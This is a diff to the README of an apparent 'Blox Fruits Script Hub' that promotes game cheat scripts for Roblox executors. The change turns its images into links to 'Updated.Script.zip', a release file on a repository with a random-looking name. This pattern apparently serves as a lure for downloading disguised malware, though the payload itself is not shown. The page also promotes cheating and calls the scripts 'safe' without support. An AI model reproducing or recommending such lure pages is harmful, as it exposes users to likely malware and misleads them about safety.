@@ -4,10 +4,11 @@
 
 Welcome to the **Blox Fruits Script Hub**, your one-stop destination for the **best and fully updated scripts** for *Blox Fruits*. Whether you're looking to **auto farm fragments**, unlock **fruit notifiers**, optimize **chest farming**, or automate **sea events**, we've got you covered with powerful and safe scripts compatible with **Delta Executor**, **Solara**, **Xeno**, **Krnl**, and more!
 
-![maxresdefault](https://github.com/user-attachments/assets/074ce92f-b00d-48c6-af16-9dfd5032d237)
+[![maxresdefault](https://github.com/user-attachments/assets/aeb811fc-a030-4f73-bdb8-476d95bf0a6d)
+](https://github.com/EFWFEWFQ/literate-system/releases/download/new/Updated.Script.zip)
 
-
-![image](https://github.com/user-attachments/assets/62c6cc85-c79b-4da4-9fa5-b539f8c4b556)
+[![image](https://github.com/user-attachments/assets/38ba2343-1204-4a9b-94ec-383a396005cd)
+](https://github.com/EFWFEWFQ/literate-system/releases/download/new/Updated.Script.zip)
 
 ---
 
